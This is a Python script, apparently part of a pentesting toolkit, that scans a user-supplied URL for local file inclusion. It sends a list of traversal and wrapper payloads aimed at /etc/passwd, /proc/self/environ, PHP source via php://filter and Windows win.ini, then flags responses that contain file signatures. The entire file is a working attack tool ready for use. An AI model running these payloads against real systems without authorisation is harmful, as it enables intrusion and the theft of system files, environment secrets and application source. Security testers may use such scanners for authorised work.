import requests
from rich.console import Console
from rich.prompt import Prompt
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import config

console = Console()

PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
    "/proc/self/cmdline",
    "C:\\Windows\\win.ini",
    "../../../../windows/win.ini",
]

SIGNS = ["root:x:", "[extensions]", "[fonts]", "daemon:", "PATH=", "localhost"]


def run():
    url = Prompt.ask("url (with param placeholder, e.g. http://t/?page=)")
    timeout = float(Prompt.ask("timeout (s)", default="5.0"))

    console.print(f"[cyan]testing {len(PAYLOADS)} LFI payloads[/cyan]")
    for p in PAYLOADS:
        try:
            r = requests.get(url + p, timeout=timeout,
                             headers={"User-Agent": config.USER_AGENT})
            body = r.text
            for s in SIGNS:
                if s in body:
                    console.print(f"[green][HIT] {p} -> {s}[/green]")
                    break
            else:
                console.print(f"[yellow][OK] {p} -> HTTP {r.status_code}[/yellow]")
        except requests.RequestException as e:
            console.print(f"[red][FAIL] {p} -> {e}[/red]")
